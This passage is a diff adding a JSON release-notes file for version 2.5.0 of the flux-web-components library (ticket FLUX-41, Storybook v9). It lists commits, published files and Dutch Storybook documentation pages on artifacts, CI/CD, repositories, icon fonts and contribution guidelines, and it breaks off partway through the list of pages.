@@ -1,0 +1,1326 @@
+{
+  "schema": 4,
+  "version": "2.5.0",
+  "ticket": "FLUX-41",
+  "entries": [
+    {
+      "id": "1679896",
+      "type": "feature",
+      "section": "Features",
+      "issues": [
+        "FLUX-41"
+      ],
+      "scope": null,
+      "components": [],
+      "topics": [],
+      "mentions": [],
+      "summary": "Storybook v9",
+      "text": "FLUX-41 - Storybook v9",
+      "commits": [
+        {
+          "sha": "1679896e668a1e429cbddccd3c227a6ed14a562d",
+          "url": "https://github.com/milieuinfo/flux-web-components/commit/1679896e668a1e429cbddccd3c227a6ed14a562d"
+        }
+      ],
+      "closes": [],
+      "derivedImpact": "opt-in",
+      "labels": [],
+      "wcag": [],
+      "source": {
+        "body": null,
+        "published": true,
+        "areas": {
+          "code": 14,
+          "styles": 10,
+          "docs": 286,
+          "storybook": 254,
+          "examples": 12,
+          "tests": 12,
+          "tooling": 16
+        },
+        "publishedFiles": [
+          "libs/common/src/declare-module.d.ts",
+          "libs/components/src/atom/atom.web-types.json",
+          "libs/components/src/atom/declare-module.d.ts",
+          "libs/components/src/block/block.web-types.json",
+          "libs/components/src/block/declare-module.d.ts",
+          "libs/components/src/block/properties/vl-properties.builder.ts",
+          "libs/components/src/block/proza-message/vl-proza-message-preloader.component.ts",
+          "libs/components/src/block/proza-message/vl-proza-message.component.ts",
+          "libs/components/src/block/video-player/vl-video-player.css.ts",
+          "libs/components/src/compliance/compliance.web-types.json",
+          "libs/components/src/compliance/declare-module.d.ts",
+          "libs/components/src/compliance/next/header/vl-header.defaults.ts",
+          "libs/components/src/form/declare-module.d.ts",
+          "libs/components/src/form/form.web-types.json",
+          "libs/map/src/declare-module.d.ts",
+          "libs/styles/src/base/var/vl-color.css.ts",
+          "libs/styles/src/base/var/vl-general.css.ts",
+          "libs/styles/src/base/var/vl-spacing.css.ts",
+          "libs/styles/src/base/var/vl-typography.css.ts",
+          "libs/styles/src/base/var/vl-z-layer.css.ts",
+          "libs/styles/src/declare-module.d.ts",
+          "libs/styles/src/layout/grid/vl-grid.css.ts",
+          "libs/styles/src/layout/section/vl-section.css.ts",
+          "libs/styles/src/theming/var/vl-components.css.ts"
+        ],
+        "storybook": [
+          {
+            "id": "afnemen-aan-de-slag--documentatie",
+            "title": "Afnemen/Aan De Slag",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/afnemen-aan-de-slag--documentatie",
+            "added": "# Aan De Slag\n## Inhoudstafel\n## Node en NPM\n## Dependencies - package.json\n## Webpack build\n## Registratie van een web-component\n## Styling\n## Documentatie\n(116 regels toegevoegd of gewijzigd; lees de pagina zelf)"
+          },
+          {
+            "id": "afnemen-artifacts--documentatie",
+            "title": "Afnemen/Artifacts",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/afnemen-artifacts--documentatie",
+            "added": "# Artifacts\n\n## Inhoudstafel\n\n- [Overzicht](#overzicht)\n- [@domg-wc/common](#domg-wccommon)\n- [@domg-wc/components/block](#domg-wccomponentsblock)\n- [@domg-wc/components/form](#domg-wccomponentsform)\n- [@domg-wc/components/compliance](#domg-wccomponentscompliance)\n- [@domg-wc/map](#domg-wcmap)\n- [fat-lib: domg-wc-compliance](#fat-lib-domg-wc-compliance)\n\n\n## Overzicht\n\nAlle web-componenten van Departement Omgeving zijn beschikbaar via npm artifacts onder de npm scope `@domg-wc`;\n__common__ bevat technische code, __styles__ alle styling en layouts die op het document gezet worden,\n__components__ en __map__ bevatten de web-componenten. De web-componenten nodig voor legacy toepassingen zijn ook\nbeschikbaar via de CDN, zie ['fat-lib: domg-wc-compliance'](#fat-lib-domg-wc-compliance).\n\n\n## @domg-wc/styles\n\n__styles__ bevat basis css: zowel de css die globaal op het document gezet wordt als de layout specifiek css\n\n\n## @domg-wc/common\n\n__common__ is een technische bibliotheek met basis code en utilities\n\n\n## @domg-wc/components\n\nHistorisch werd een __component__ geïmplementeerd als een `BaseElement`: een eigen basis klasse beschikbaar in\n@domg-wc/common via de methode `BaseElementOfType`. Nieuwere componenten worden geïmplementeerd m.b.v.\n[LitElement](https://lit.dev/docs/api/LitElement/); het doel op (lange) termijn is van alles (ook van de compliance\n en map) LitElementen te maken.\n\nEen __component__ heeft technisch volgende eigenschappen:\n\n- extends van BaseElement of van LitElement\n- steeds te gebruiken als custom tag; bvb. `<vl-breadcrumb></vl-breadcrumb>`\n- heeft __steeds__ een shadow DOM\n- de styling komt mee met de component (wordt geïnjecteerd in de shadow DOM)\n\nDe componenten zijn onderverdeeld in 4 soorten:\n\n- __atom__ : kleine, native componenten, o.a. button, icon, link, ...\n- __block__ : de typische bouwstenen met middelmatige complexiteit,  o.a. accordion, alert, ...\n- __compliance__ : bevat de Departement Omgeving specifieke componenten; o.a. header, footer, privacy, ...\n- __form__ : de input componenten; typisch in een formulier te gebruiken\n\n\n## @domg-wc/map\n\nDe __map__ is de grootste en uitgebreidste component. Het is een kaart component die achterliggend\n[OpenLayers v8.2.0](https://openlayers.org) gebruikt. De functionaliteit zit in sub-componenten\ndie een plugin opzet volgen.\n\n\n## fat-lib: domg-wc-compliance\n\nVoor legacy toepassingen is er een 'fat-lib' variant van de web-componenten beschikbaar, hierin zijn enkel de\n'compliance' componenten beschikbaar (vl-header / vl-footer / vl-accessibility / ...). Via de CDN van Departement\nOmgeving kan je daar ge-versioneerd naar refereren conform: `https://cdn.omgeving.vlaanderen.be/domg/domg-wc/2.0.0/domg-wc-compliance-2.0.0.min.js`.\nBij de import worden de beschikbare web-componenten geregistreerd. Zie\n[CDN Bundel - fat-lib](/docs/recepten-cdn-bundel-fat-lib--documentatie) onder `Cookbook` voor meer informatie."
+          },
+          {
+            "id": "afnemen-migratie-v2-aanpak--documentatie",
+            "title": "Afnemen/Migratie v2 - Aanpak",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/afnemen-migratie-v2-aanpak--documentatie",
+            "added": "# Migratie v2 - Aanpak\n## Inhoudstafel\n## Aanpak Overzicht\n## Aanpak Detail\n### 1. Migratie naar de nieuwste v1 release\n### 2. Legacy componenten vervangen door hun \"next\"-variant\n#### **2.1 Elementen wegwerken**\n#### **2.2 \"next\"-varianten implementeren**\n#### **2.3 \"vl-u-...\" utility classes**\n### 3. Migratie naar de v2 release\n#### **3.1 Wijzigingen in v2**\n#### **3.2 Migratie acties**\n#### **3.3 Imports**\n#### **3.4 Optimalisaties**\n(204 regels toegevoegd of gewijzigd; lees de pagina zelf)"
+          },
+          {
+            "id": "afnemen-migratie-v2-faq--documentatie",
+            "title": "Afnemen/Migratie v2 - FAQ",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/afnemen-migratie-v2-faq--documentatie",
+            "added": "# Migratie v2 - FAQ\n## Kan ik direct importeren of moet ik de registerWebComponents functie gebruiken?\n## Blijft de fat-js bundel beschikbaar?\n## De event listeners werken niet meer.\n## Attributen-wijzigingen\n## Wat is de impact op vl-grid?\n## data-vl-no-space-top op een section werkt niet meer\n## De form validation error message verschijnt niet. Wat kan de oorzaak zijn?\n## Na het verwijderen van de `data-vl-` prefix zijn er zaken gebroken. Hoe kan dit?\n(137 regels toegevoegd of gewijzigd; lees de pagina zelf)"
+          },
+          {
+            "id": "afnemen-migratie-v2-impact--documentatie",
+            "title": "Afnemen/Migratie v2 - Impact",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/afnemen-migratie-v2-impact--documentatie",
+            "added": "# Migratie v2 - Impact\n## Geïmpacteerde Web Componenten\n### Accordion List\n### Action Group\n### Annotation\n### Body\n### Button\n### Button Pill\n### Checkbox\n### Code Preview\n### Content block\n### Datepicker\n### Data Table\n### Doormat\n### Form\n### Form Annotation\n### Form Grid\n### Form Label\n### Form Validation\n### Form Validation Message / Form Message\n### Grid\n### Group\n### Http Error Message\n### Icon\n### Image\n### Infotext\n### Input Field\n### Input Group\n### Link\n### Paragraph\n### Link List\n### Margin\n### Padding\n### Pattern\n### Progress Bar / Progress Indicator\n### Properties\n### Radio Group / Radio\n### Search Filter\n### Search Result\n### Section\n### Select / MultiSelect / Select Rich\n### Select Location\n### Separator\n### Spacer\n### Stacked\n### Side Navigation\n### Steps / Step\n### Tabs / Tabs Pane\n### Text\n### Textarea / Textarea Rich\n### Title\n### Toaster\n### Upload\n### Video Player\n(1987 regels toegevoegd of gewijzigd; lees de pagina zelf)"
+          },
+          {
+            "id": "afnemen-starter-app--documentatie",
+            "title": "Afnemen/Starter App",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/afnemen-starter-app--documentatie",
+            "added": "# Starter App\n## Inhoudstafel\n## Doel\n## Bibliotheken\n## Concept\n## Praktisch\n## Opzet\n# install Volta\n# install Node\n# start using Node\n## Scripts\n## Tooling\n### IDE & Git\n### Webpack\n### TypeScript\n### Lit\n### Prettier\n### ESLint\n### Jest\n### Cypress\n(144 regels toegevoegd of gewijzigd; lees de pagina zelf)"
+          },
+          {
+            "id": "beheren-ci-cd--documentatie",
+            "title": "Beheren/CI - CD",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/beheren-ci-cd--documentatie",
+            "added": "# CI - CD\n\n## Inhoudstafel\n\n- [Beschrijving](#beschrijving)\n- [Bamboo Configuratie](#bamboo-configuratie)\n- [Bamboo Release](#bamboo-release)\n\n\n## Beschrijving\n\nDe build loopt via [Bamboo](https://www.milieuinfo.be/bamboo/chain/viewChain.action?planKey=flux-CUWC).\n\nOm de versionering te sturen en een changelog te genereren wordt de\n[semantic-release](https://github.com/semantic-release/semantic-release) plugin gebruikt.\n\nDe verschillende releases zijn terug te vinden op de\n[release pagina](https://github.com/milieuinfo/flux-web-components/releases) van de GitHub repository.\n\n\n## Bamboo Configuratie\n\nDe build configuratie zit in het `bamboo.yml` bestand in de root folder `bamboo-specs`. In Bamboo bestaat een\nbuild-plan uit stages die sequentieel lopen, de volgende stage start pas als de vorige stage succesvol gelopen heeft.\nEen stage bestaat zelf uit 1 of meerdere jobs, de jobs binnen een stage kunnen parallel lopen. Volgende stages en jobs\nzijn gedefinieerd:\n\n1. __Checkout, Install and Cache Stage__ - met de job\n    * __checkout-install-and-cache__: checkout van de repo, npm installatie, caching van de node_modules en Cypress\n2. __Build and Test Stage__ - met de volgende jobs die parallel lopen:\n    * __build-apps-and-libs__ (de build),\n    * __unit-component-integrator-tests__ (verschillende testen)\n    * __e2e-tests-storybook__ (Stroybook e2e-testen)\n3. __Release and Publish Stage__ - met de jobs\n    * __release-and-publish__: deze loopt niet voor feature branches, er is een licht verschillende flow voor release\n      en pre-release branches\n4. __Verify Release Stage__ - met de job\n    * __verify-release__: verifieert dat de ge-releaste artifacts afneembaar zijn\n\n\n## Bamboo Release\n\nEen release vindt plaats in de __release-and-publish__ job en wordt gestuurd door\n[semantic-release](https://github.com/semantic-release/semantic-release). De configuratie van die plugin is te vinden\nin de root folder en zit in 2 bestanden: `.releaserc-develop` en `.releaserc-release`. De develop variant loopt voor de\npre-release branches ('develop' en 'develop-xyz'), de release variant voor de 'release' en 'release-x.y' branches.\n\nIn die __release-and-publish__ stap gebeurd het volgende:\n\n- semantic-release bepaalt het nieuwe versie nummer a.d.h.v. de commits (fix / feat / breaking-change) - met een\n  `-develop` suffix voor develop branches\n- de te publiceren artifacts krijgen het versie nummer\n- er wordt een tag gelegd met het versie nummer\n- de artifacts worden gepushed naar [Artifactory](https://repo.omgeving.vlaanderen.be/ui/packages)\n- in het geval van een release wordt er een changelog aangemaakt en een\n[GitHub release](https://github.com/milieuinfo/flux-web-components/releases) uitgevoerd"
+          },
+          {
+            "id": "beheren-git-release-branching--documentatie",
+            "title": "Beheren/Git Release Branching",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/beheren-git-release-branching--documentatie",
+            "added": "# Git Release Branching\n\n## Inhoudstafel\n\n- [Beschrijving](#beschrijving)\n- [Diagram](#diagram)\n\n\n## Beschrijving\n\nOnderstaand diagram geeft een overzicht van hoe commit's - door ze naar verschillende branches te brengen - tot\n(pre-)releases leiden. De blauwe boxen geven tags aan die gelegd worden in GitHub. Voor elke tag zal er een\nartifact geproduceerd worden met de tag als suffix. De release- en pre-release-artifacts zijn beschikbaar via\n[artifactory](https://repo.omgeving.vlaanderen.be/ui/packages).\n\nVia de pre-release branches worden er beta-releases gebouwd, via de release-branches finale releases.\n\nNa een commit op eender welke branch loopt de build en alle testen, zie\n[Beheren/CI - CD](/docs/beheren-ci-cd--documentatie) voor uitgebreidere informatie.\n\n\n## Diagram\n\n<img src={fluxBranching} alt=\"Flux Branching Strategie\" />"
+          },
+          {
+            "id": "beheren-icon-font--documentatie",
+            "title": "Beheren/Icon Font",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/beheren-icon-font--documentatie",
+            "added": "# Icon Font\n\n## Inhoudstafel\n\n- [Beschrijving](#beschrijving)\n- [Legacy opzet](#oude-opzet)\n- [V2 opzet](#v2-opzet)\n- [Het font updaten](#het-font-updaten)\n\n\n## Beschrijving\n\nHet icon-font is deel van de flux-assets repository en wordt geversioneerd gepubliceerd op de CDN van Departement\nOmgeving.<br/>\nDe flux-web-components refereren intern naar dit font via CSS-classes die een mapping voorzien tussen de icoon-naam\nen de unicode waarde van het icoon in het font.\n\n## Legacy opzet\n\nIn de oude opzet bevatten alle componenten die een icoon nodig hebben de icon-mapping CSS-classes. Dit zorgt voor\nveel duplicatie van CSS code.\n\n## v2 opzet\n\nEr is een centrale plaats in de flux-web-components repository waar de icon-mapping CSS-classes gedefinieerd worden\nals CSS-in-JS. Elk component dat een icoon nodig heeft importeert dit icon-mapping bestand. Er is geen duplicatie\nvan CSS omdat overal dezelfde instantie van het CSS-in-JS object gebruikt wordt. Dit icon-mapping bestand wordt\ngegenereerd m.b.v. het script `resources/generate-icons/generate-icon-files.ts`.\n\n## Het font updaten\n\nVolg de volgende stappen om het icon-font te updaten:\n- plaats de nieuwe versie van het font in de flux-assets repository\n- deploy de nieuwe versie van het font geversioneerd op de CDN van Departement Omgeving\n- refereer in de flux-web-components repository naar de nieuwe versie van het font\n- voer het `generate-icon-files.ts` script uit in de flux-web-components repository (`npm run libs:icons:generate`)\n- verifieer dat de icon-mapping correct is gegenereerd met behulp van de\n  [icon pagina](/story/components-icon--all-icons)"
+          },
+          {
+            "id": "beheren-repositories--documentatie",
+            "title": "Beheren/Repositories",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/beheren-repositories--documentatie",
+            "added": "# Repositories\n\n## Inhoudstafel\n\n- [Overzicht](#overzicht)\n- [flux-web-components](#flux-web-components)\n- [flux-assets](#flux-assets)\n- [flux-builds](#flux-builds)\n\n\n## Overzicht\n\nEr zijn 3 repositories van Flux:\n- flux-web-components - [https://github.com/milieuinfo/flux-web-components](https://github.com/milieuinfo/flux-web-components)\n- flux-assets - [https://github.com/milieuinfo/flux-assets](https://github.com/milieuinfo/flux-assets)\n- flux-builds - [https://github.com/milieuinfo/flux-builds](https://github.com/milieuinfo/flux-builds)\n\n\n## flux-web-components\n\nDe belangrijkste repo die de broncode van de flux-web-components bevat, de Storybook documentatie en de Playground\ntoepassingen. Dit is een mono-repo.\n\n\n## flux-assets\n\nDe flux-web-components hebben externe afhankelijkheden.  Die externe assets worden onder dit project opgenomen en\ngepubliceerd op de CDN van Departement Omgeving. Code zal dus gebruik maken van versies gepubliceerd op de CDN.\n\nVolgende assets zitten in deze repo: __govflanders-font__, __govflanders-style__ en __tinymce__\n\n### govflanders-font\n\nDigitaal Vlaanderen voorziet eigen fonts, er zijn er 2\n-  FlandersArt: in de varianten italic / sans - met telkens de sub-varianten black, bold, light, medium, regular\n   en thin\n-  vlaanderen-icon (en icon-classic)\n\nDe flux-web-components refereren intern (geversioneerd) naar deze fonts. Voornamelijk voor het icon-font is de\nversionering belangrijk daar de icoon referenties gelijk moeten lopen met het font voor de desbetreffende versie.\nVoor meer informatie over het beheren van het icon-font zie de [Icon Font](/docs/beheren-icon-font--documentatie) documentatie.\n\n### govflanders-style\n\nDe hoofdbrok van styling komt uit het Webuniversum van Digitaal Vlaanderen. Hun styling wordt aangeboden via\nverschillende packages die .scss bestanden bevatten. De Flux web-componenten hebben vaak een shadow-dom, dit heeft\ntechnische gevolgen die tot css duplicatie leiden, deze asset vermindert deze duplicatie.\n\nTechnisch worden in deze asset de DV packages gerefereert, de sccs verwerkt en gewrapped in .js bestanden. Het\nresultaat wordt als geversioneerd artifact aangeboden waarop de flux-web-components dan dependen.\n\n### tinymce\n\n[TinyMCE](https://www.tiny.cloud/) - een WYSIWYG editor gebruikt in `vl-textarea` - heeft theming nodig die statisch\ngerefereerd wordt. I.p.v. elke toepassing deze theming apart te laten voorzien wordt die via dit asset geversioneerd\naangeboden op de CDN.<br/>\nOnder `tinymce` zit de theming voor v5.10.6, onder `tinymce-next` deze voor v6.8.3.\n\n\n## flux-builds\n\nDe repo die de geversioneerde documentatie bevat,\nzie [Beheren/Documentatie Publicatie](/docs/beheren-documentatie-publicatie--documentatie) voor meer informatie."
+          },
+          {
+            "id": "beheren-storybook-publicatie--documentatie",
+            "title": "Beheren/Storybook Publicatie",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/beheren-storybook-publicatie--documentatie",
+            "added": "# Storybook Publicatie\n\n## Inhoudstafel\n\n- [Beschrijving](#beschrijving)\n- [Structuur](#structuur)\n\n\n## Beschrijving\n\nDocumentatie wordt geversioneerd gepubliceerd op https://flux.omgeving.vlaanderen.be, de structuur van die\n[repo](https://github.com/milieuinfo/flux-builds) staat hier beschreven.\n\n\n## Structuur\n\n```\nflux-builds/\n├─ develop/\n│  ├─ 2.0.0-beta.2/ [beta versies worden enkel op aanvraag toegevoegd]\n│  │  ├─ artifacts/ [beta artifacts]\n│  │  │  ├─ domg-wc-common-2.0.0.beta.2.tgz\n│  │  │  ├─ domg-wc-components-2.0.0.beta.2.tgz\n│  │  │  ...\n│  │  ├─ storybook/ [beta storybook]\n│  ├─ latest/\n│  │  ├─ storybook/\n│  │  │  ├─ index.html [redirects naar de recentste beta storybook]\n│  ├─ index.html [landingspagina met links naar de verschillende develop versies]\n├─ release-v1/ [een sub-folder per ge-releasde versie]\n│  ├─ 1.0.0/\n│  │  ├─ storybook/\n│  │  ...\n│  ├─ 1.9.0/\n│  │  ├─ storybook/\n│  ├─ latest/\n│  │  ├─ storybook/\n│  │  │  ├─ index.html [redirects naar de recentste storybook]\n│  ├─ index.html [landingspagina met links naar de verschillende release versies]\n├─ index.html [landingspagina met links naar develop en release]\n```"
+          },
+          {
+            "id": "bijdragen-cypress--documentatie",
+            "title": "Bijdragen/Cypress",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/bijdragen-cypress--documentatie",
+            "added": "# Cypress\n## Inhoudstafel\n## Richtlijnen\n## Naamgeving\n## Structuur\n## DOM- vs WC-testen\n### DOM-testen\n### WC-testen (Web Component testen)\n## Fijnmazigheid\n## WCAG-compliancy\n## Styling Aftesten\n## Uitvoeren\n### Integrator E2E tests\n### Storybook E2E tests\n### Component tests\n(182 regels toegevoegd of gewijzigd; lees de pagina zelf)"
+          },
+          {
+            "id": "bijdragen-git-branching-strategie--documentatie",
+            "title": "Bijdragen/Git Branching Strategie",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/bijdragen-git-branching-strategie--documentatie",
+            "added": "# Git Branching Strategie\n## Inhoudstafel\n## Overzicht\n## Branching Concepten\n### Feature Branches\n### Commit Boodschappen\n### Squashen\n### Rebasen\n### Pull Requests (PR's)\n### PR Code Reviews\n## Team Branching Strategie\n(134 regels toegevoegd of gewijzigd; lees de pagina zelf)"
+          },
+          {
+            "id": "bijdragen-opzet-structuur--documentatie",
+            "title": "Bijdragen/Opzet & Structuur",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/bijdragen-opzet-structuur--documentatie",
+            "added": "# Opzet & Structuur\n\n## Inhoudstafel\n\n-   [Opzet](#opzet)\n-   [Structuur](#structuur)\n\n## Opzet\n\nDe code van de web-componenten bibliotheek zit in GitHub onder de\n[flux-web-components](https://github.com/milieuinfo/flux-web-components) repository. Het is een monorepo, opgezet met\ncustom scripts, wel wordt de [Nx](https://nx.dev/) structuur gevolgd (vroeger was het Nx).\n\nOntwikkeling gebeurt [branch-based](/docs/bijdragen-git-branching-strategie--documentatie) waarbij het\n[release proces](/docs/beheren-ci-cd--documentatie) volledig geautomatiseerd is.\n\nNaast de web-componenten bibliotheek zijn er nog [andere repositories](/docs/beheren-repositories--documentatie).\n\n### Private dependencies\n\nEen aantal dependencies zijn interne private npm packages. Om deze te kunnen installeren moet de Artifactory registry\ncorrect geconfigureerd worden, met een persoonlijke authToken, in het root `~/.npmrc` bestand. Meer informatie vind je\n[hier](/docs/recepten-artifactory-configuratie--documentatie).\n\n### Node versie en Volta\n\nWe gebruiken Node en npm om dependencies te beheren en scripts uit te voeren. De Node versie is vastgelegd in de\n package.json.<br/>\nWe gebruiken [Volta](https://get.volta.sh) om de juiste Node versie te installeren:\n\n```\nvolta install node@20.11.0\nnode -v\nv20.11.0\n```\n\nIndien de versie niet klopt moet je de `PATH` variabele aanpassen en de Volta bin vooraan zetten. In `~/.zprofile` kan\n je daarvoor deze lijn toevoegen:\n\n```\nexport PATH=\"/Users/(your user)/.volta/bin:$PATH\"\n```\n\n## Structuur\n\nHieronder staat de projectstructuur van de [flux-web-components](https://github.com/milieuinfo/flux-web-components)\nrepo beschreven, achter de pijltjes staan de artifacts gespecifieerd die uit de sub-projecten komen.\n\n```\n─ flux-web-components/\n  ├─ apps/\n  │  ├─ consumer/\n  │  ├─ consumer-e2e/\n  │  ├─ integrator/\n  │  ├─ integrator-e2e/ (Cypress CSP testen)\n  │  ├─ playground-lit/\n  │  ├─ playground-native/\n  │  ├─ playground-react/\n  │  ├─ storybook/\n  │  ├─ storybook-e2e/ (Cypress testen tov storybook)\n  │   -> worden niet als artifact gepubliceerd\n  ├─ libs/\n  │  ├─ common/\n  │  │   -> @domg-wc/common\n  │  ├─ components/\n  │  │   -> @domg-wc/components\n  │  ├─ integrations/\n  │  │   -> geen artifact, enkel voor intern gebruik in de integrator-app\n  │  ├─ map\n  │  │   -> @domg-wc/map\n  │  ├─ styles\n  │  │   -> @domg-wc/styles\n  ├─ resources/\n```\n\nEr zitten verschillende applicaties en libs in de repo.\n\n### Storybook\n\nStorybook (deze documentatie) streeft naar het aanbieden van zo correct mogelijke informatie en documentatie.\n\n### Playground's\n\nDe verschillende Playground applicaties zijn bedoeld om integraties en combinaties van componenten in verschillende\nframeworks te testen.\n\n### Consumer\n\nConsumer is de toepassing om te verifiëren dat de gereleasete artifacts afneembaar zijn. Er zitten afnames in\nmet named-imports, side-effect-imports en imports van de fat-lib.\n\n### Integrator\n\nIntegrator wordt gebruikt om integraties te voorzien die ruimer zijn dan 1 component of die technisch nodig zijn\nom getest te kunnen worden, het wordt bvb. voor CSP verificatie gebruikt.\n\n### Libs\n\nDe feitelijke componenten zitten opgesplitst in een aantal bibliotheken onder de libs folder. Ze worden aangeboden\nals [npm packages](/docs/afnemen-artifacts--documentatie)."
+          },
+          {
+            "id": "bijdragen-richtlijnen--documentatie",
+            "title": "Bijdragen/Richtlijnen",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/bijdragen-richtlijnen--documentatie",
+            "added": "# Richtlijnen\n\n## Inhoudstafel\n\n- [Code Formattering](#code-formattering)\n- [Codeer Richtlijnen](#codeer-richtlijnen)\n\n\n## Code Formattering\n\nCode formattering gebeurt m.b.v. Prettier, de configuratie bevindt zich op root niveau in het `.prettierrc` bestand.\n\nIn <ins>IntelliJ</ins> kan je Prettier configureren onder `Preferences > Languages & Frameworks > Prettier` <br/>\n&nbsp;&nbsp;-> zorg dat `Prettier package` verwijst naar de juiste `node_modules/prettier` folder <br/>\n&nbsp;&nbsp;-> vink beide vinkjes aan zodat Prettier wordt toegepast zowel bij expliciet formatteren als bij bewaren <br/>\n&nbsp;&nbsp;-> 'Run for files' kan je configureren als `{**/*,*}.{js,mjs,ts,jsx,tsx}`\n\n\n## Codeer Richtlijnen\n\n### Backwards Compatibiliteit\n\n> Belangrijk: het gaat hier om een componenten bibliotheek, er zijn verschillende versies van in omloop! Het is niet\nzoals een toepassing waar een nieuwe release de vorige versie volledig vervangt!\n\n- afnemers moeten (relatief) makkelijk kunnen upgraden\n    - het streefdoel is backwards compatibel te blijven, je kan dus niet zomaar bestaande naamgeving\n      (component, methode, attribuut) wijzigen\n    - code in afnemende toepassingen kan extenden van onze code, er is geen volledig overzicht van alle afhankelijkheden\n    - 'dode' code kan best gebruikt worden in een eindtoepassing, het wil gewoon zeggen dat er geen testen of andere\n       referenties zijn in 'onze' codebase\n    - 'levende' code in onze codebase kan mogelijks nergens gebruikt worden in een eindtoepassing (en feitelijk dood\n       zijn)\n- op termijn zullen er backwards incompatibele wijzigingen gebeuren, dat zal via major releases gebeuren die duidelijk\n  gecommuniceerd en gedocumenteerd worden\n- major releases worden gestuurd door ontwikkeling van het Flux-team, andere teams die bijdragen moeten steeds backwards\n  compatibele code schrijven - refactorings in bestaande code zijn niet toegestaan voor hen\n- toevoegingen zijn minder strikt, maar behoud de geest van de bestaande code (typisch het bestand in kwestie)\n- een hoofddoel is consistentie te verkrijgen, een nieuwe aanpak introduceren kan enkel na overleg\n\n### Web-Componenten\n\nVoor de feitelijke code van de web-componenten zijn richtlijnen en conventies, deze zijn echter niet in steen\ngebeiteld! Momenteel zijn er 2 basis klasses: BaseElement en BaseLitElement. Op termijn zal alles extenden van\nBaseLitElement, BaseElement wordt weggewerkt.\n\nDe best practices zijn gedocumenteerd onder [Afnemen / Artifacts](/docs/afnemen-artifacts--documentatie), nieuwe\ncomponenten moeten ineens als BaseLitElement geïmplementeerd worden.\n\n### Typescript\n\nDe componenten bibliotheek wordt zo goed als mogelijk getypeerd om bugs te vermijden en met meer vertrouwen\nrefactorings te kunnen doorvoeren. De huidige typering is beperkt, het is vaak JavaScript met minimale typing\ntoevoegingen. Dit wordt stelselmatig verbeterd - extra typing toevoegen mag dus!\n\n> Opgelet 1: typing toevoeging is letterlijk de JavaScript code laten zoals ze is en enkel typing toevoegen, dus\ngeen code wijzigingen doorvoeren om te kunnen typen!\n\n> Opgelet 2: aanpassingen of verbeteringen dienen steeds te gebeuren met backwards-compatibiliteit in het achterhoofd\nbvb. iets dat niet geïnitialiseerd was nu ineens initialiseren is een risico (falsy-rules in combinatie met\nonduidelijkheid over hoe afnemers onze code gebruiken)\n\n### Icons\n\nDoorheen verschillende componenten worden icons - voorzien door Digitaal Vlaanderen - gebruikt, op de DV\nwebsite vind je het overzicht van alle [beschikbare iconen](https://overheid.vlaanderen.be/webuniversum/v3/documentation/atoms/vl-ui-icon/).\n\n### Cypress\n\nRichtlijnen m.b.t. Storybook vind je terug onder [Bijdragen / Cypress](/docs/bijdragen-cypress--documentatie).\n\n### Storybook\n\nRichtlijnen m.b.t. Storybook vind je terug onder [Bijdragen / Storybook](/docs/bijdragen-storybook--documentatie)."
+          },
+          {
+            "id": "bijdragen-storybook--documentatie",
+            "title": "Bijdragen/Storybook",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/bijdragen-storybook--documentatie",
+            "added": "# Storybook\n## Inhoudstafel\n## Referenties\n## Bestanden\n## Story opbouw\n### Default Export\n### Story Template\n### Stories\n## Args\n## ArgTypes\n## Docs\n# <naam>\n## Voorbeeld\n## Configuratie\n## Varianten\n### Naam Variant 1\n### Naam Variant 2\n## Referenties\n### Digitaal Vlaanderen\n### Legacy Documentatie\n## Storybook lokaal opstarten\n(307 regels toegevoegd of gewijzigd; lees de pagina zelf)"
+          },
+          {
+            "id": "changelog--documentatie",
+            "title": "Changelog",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/changelog--documentatie",
+            "added": "# Changelog\n\n<br/>\n\n    {changelog}"
+          },
+          {
+            "id": "components-atom-button--documentatie",
+            "title": "Components - Atom/button",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/components-atom-button--documentatie",
+            "added": null
+          },
+          {
+            "id": "components-atom-heading-style--documentatie",
+            "title": "Components - Atom/heading-style (intern)",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/components-atom-heading-style--documentatie",
+            "added": null
+          },
+          {
+            "id": "components-atom-icon--documentatie",
+            "title": "Components - Atom/icon",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/components-atom-icon--documentatie",
+            "added": null
+          },
+          {
+            "id": "components-atom-icon-style--documentatie",
+            "title": "Components - Atom/icon-style (intern)",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/components-atom-icon-style--documentatie",
+            "added": null
+          },
+          {
+            "id": "components-atom-link--documentatie",
+            "title": "Components - Atom/link",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/components-atom-link--documentatie",
+            "added": null
+          },
+          {
+            "id": "components-atom-link-style--documentatie",
+            "title": "Components - Atom/link-style (intern)",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/components-atom-link-style--documentatie",
+            "added": null
+          },
+          {
